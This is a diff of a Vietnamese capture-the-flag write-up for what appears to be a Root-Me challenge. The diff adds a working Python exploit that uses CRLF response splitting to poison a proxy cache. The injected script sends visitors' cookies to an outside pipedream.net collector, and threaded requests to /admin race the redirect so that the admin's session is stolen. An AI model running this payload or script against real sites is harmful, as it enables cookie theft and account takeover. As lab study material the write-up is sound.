@@ -36,9 +36,46 @@ Trường này sẽ chỉ định việc redirect về trang /home, và việc n
 
 Tuy nhiên nhờ vào trường Location có trong http response thì trình duyệt sẽ tự động nhảy về /home ngay lập tức, dẫn tới việc attacker không thể gửi request thứ 2 tới /admin kịp. Vì vậy để exploit thành công thì mình đã viết 1 đoạn code sử dụng multi-threading để có thể gửi request thứ 2 tới /admin trước khi bị chuyển hướng về /home.
 
-Đoạn code này mình sẽ up lên sau.
+```python
 
-Chương trình mình viết bao gồm 2 function, 1 để poison cache của proxy bằng việc gửi 1000 payload để inject và 1 để gửi request tới /admin làm cho việc inject thành công. Để chắc chắn mình đã cho 4 luồng chạy song song.
+import requests
+import threading
+
+poisoned_url = "http://challenge01.root-me.org:58002/user/param?lang=en%0D%0AContent-%20Length%3A%200%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0ALast-modified%3A%20Thu%2C%2001%20Jan%202100%2012%3A00%3A00%20GMT%20%0D%0AContent-Length%3A%20134%0D%0A%0D%0A%3Cscript%3Edocument.write%28%22%3Ch1%3EEXP%3C%2Fh1%3E%3Cimg%20src%3Dhttps%3A%2F%2Feoyoae37hp6q6ss.m.pipedream.net%3F%22.concat%28document.cookie%29.concat%28%22%20%2F%3E%22%29%29%3C%2Fscript%3E"
+admin_url = "http://challenge01.root-me.org:58002/admin"
+header = {"Pragma":"no-cache"}
+cookies = {"user_session":"Your session"}
+
+def poison_func():
+	i=0
+	while i<1000:
+		print("i=" + str(i))
+		requests.get(url=poisoned_url,headers=header,cookies=cookies)
+		i+=1
+
+def access_func():
+	j=0
+	while j<1000:
+		print("j=" + str(j))
+		requests.get(url=admin_url,headers=header,cookies=cookies,allow_redirects=False)
+		j+=1
+
+try:
+	t1 = threading.Thread(target=poison_func)
+	t2 = threading.Thread(target=access_func)
+	t3 = threading.Thread(target=poison_func)
+	t4 = threading.Thread(target=access_func)
+	t1.start()
+	t2.start()
+	t3.start()
+	t4.start()
+except:
+	print("Error")
+
+
+```
+
+Chương trình mình viết bao gồm 2 function, 1 để poison cache của proxy bằng việc gửi 1000 payload để inject và 1 để gửi request tới /admin làm cho việc inject thành công. Để chắc chắn mình đã cho 4 luồng chạy song song. Các bạn nhớ thay thế phần url ở biến poisoned_url thành payload của bạn. Đối với user_session cũng tương tự.
 
 Chạy chương trình và đợi 1 khoảng thời gian sau đó để admin ghé thăm /admin thì mình nhận thấy việc inject đã thành công vì đã có 1 request gửi tới trang RequestBin chứa session của admin.
 
